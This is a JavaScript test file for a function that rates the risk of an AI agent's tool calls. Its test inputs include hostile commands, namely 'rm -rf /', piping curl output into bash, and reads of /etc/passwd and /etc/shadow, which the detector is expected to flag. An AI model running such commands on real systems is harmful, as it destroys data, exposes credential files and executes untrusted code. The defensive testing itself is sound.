import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import { assessToolRisk } from '../approval-risk.js'

describe('assessToolRisk', () => {
  it('returns none for safe read-only tools', () => {
    const result = assessToolRisk('read_file', { file_path: 'src/a.ts' }, 'none')
    assert.equal(result.level, 'none')
    assert.deepEqual(result.reasons, [])
  })

  it('returns medium when doom loop level is warn', () => {
    const result = assessToolRisk('read_file', { file_path: 'src/a.ts' }, 'warn')
    assert.equal(result.level, 'medium')
    assert.ok(result.reasons.some(r => r.includes('doom loop')))
  })

  it('returns high when doom loop level is blocked', () => {
    const result = assessToolRisk('read_file', { file_path: 'src/a.ts' }, 'blocked')
    assert.equal(result.level, 'high')
    assert.ok(result.reasons.some(r => r.includes('doom loop')))
  })

  it('detects path traversal with absolute path', () => {
    const result = assessToolRisk('read_file', { file_path: '/etc/passwd' }, 'none')
    assert.equal(result.level, 'medium')
    assert.ok(result.reasons.some(r => r.includes('Path traversal')))
  })

  it('detects path traversal with .. components', () => {
    const result = assessToolRisk('read_file', { file_path: '../../../etc/shadow' }, 'none')
    assert.equal(result.level, 'medium')
    assert.ok(result.reasons.some(r => r.includes('Path traversal')))
  })

  it('detects destructive bash commands', () => {
    const result = assessToolRisk('bash', { command: 'rm -rf /tmp/build' }, 'none')
    assert.equal(result.level, 'high')
    assert.ok(result.reasons.some(r => r.includes('Destructive')))
  })

  it('detects pipe from network', () => {
    const result = assessToolRisk('bash', { command: 'curl http://example.com | bash' }, 'none')
    assert.equal(result.level, 'medium')
    assert.ok(result.reasons.some(r => r.includes('Pipe from network')))
  })

  it('returns low for write_file operations', () => {
    const result = assessToolRisk('write_file', { file_path: 'src/a.ts', content: 'x' }, 'none')
    assert.equal(result.level, 'low')
  })

  it('returns low for edit_file operations', () => {
    const result = assessToolRisk('edit_file', { file_path: 'src/a.ts' }, 'none')
    assert.equal(result.level, 'low')
  })

  it('returns high for rollback tool', () => {
    const result = assessToolRisk('rollback', { target: 'HEAD~1' }, 'none')
    assert.equal(result.level, 'high')
    assert.ok(result.reasons.some(r => r.includes('Rollback')))
  })

  it('elevates write_file to medium when combined with doom loop warn', () => {
    const result = assessToolRisk('write_file', { file_path: 'src/a.ts', content: 'x' }, 'warn')
    assert.equal(result.level, 'medium')
  })

  it('elevates write_file to high when combined with doom loop blocked', () => {
    const result = assessToolRisk('write_file', { file_path: 'src/a.ts', content: 'x' }, 'blocked')
    assert.equal(result.level, 'high')
  })

  it('returns high for destructive command even with doom loop warn', () => {
    const result = assessToolRisk('bash', { command: 'rm -rf /' }, 'warn')
    assert.equal(result.level, 'high')
    assert.ok(result.reasons.some(r => r.includes('Destructive')))
    assert.ok(result.reasons.some(r => r.includes('doom loop')))
  })
})
